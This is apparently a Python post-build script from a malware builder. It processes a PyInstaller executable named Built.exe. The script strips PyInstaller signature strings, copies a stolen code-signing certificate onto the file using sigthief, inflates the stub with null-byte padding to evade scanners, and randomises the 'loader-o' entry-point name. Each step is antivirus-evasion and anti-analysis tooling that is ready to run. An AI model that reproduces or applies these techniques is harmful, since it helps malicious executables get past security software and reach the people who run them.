import os
from sigthief import signfile
from PyInstaller.archive.readers import CArchiveReader

def remove_metadata(path: str):
    print("Removing MetaData")
    with open(path, "rb") as file:
        data = file.read()
    
    # Remove PyInstaller strings
    data = data.replace(b"PyInstaller:", b"PyInstallem:")
    data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
    data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")

    with open(path, "wb") as file:
        file.write(data)

def add_certificate(path: str):
    print("Adding Certificate")
    cert_file = "cert"
    if os.path.isfile(cert_file):
        signfile(path, cert_file, path)

def pump_stub(path: str, pump_file: str):
    print("Pumping Stub")
    try:
        pumped_size = 0
        if os.path.isfile(pump_file):
            with open(pump_file, "r") as file:
                pumped_size = int(file.read())
    
        if pumped_size > 0 and os.path.isfile(path):
            reader = CArchiveReader(path)
            offset = reader._start_offset

            with open(path, "r+b") as file:
                data = file.read()
                if pumped_size > len(data):
                    pumped_size -= len(data)
                    file.seek(0)
                    file.write(data[:offset] + b"\x00" * pumped_size + data[offset:])
    except Exception:
        pass

def rename_entry_point(path: str, entry_point: str):
    print("Renaming Entry Point")
    with open(path, "rb") as file:
        data = file.read()

    entry_point = entry_point.encode()
    new_entry_point = b'\x00' + os.urandom(len(entry_point) - 1)
    data = data.replace(entry_point, new_entry_point)

    with open(path, "wb") as file:
        file.write(data)

if __name__ == "__main__":
    built_file = os.path.join("dist", "Built.exe")
    if os.path.isfile(built_file):
        remove_metadata(built_file)
        add_certificate(built_file)
        pump_stub(built_file, "pumpStub")
        rename_entry_point(built_file, "loader-o")
    else:
        print("Not Found")
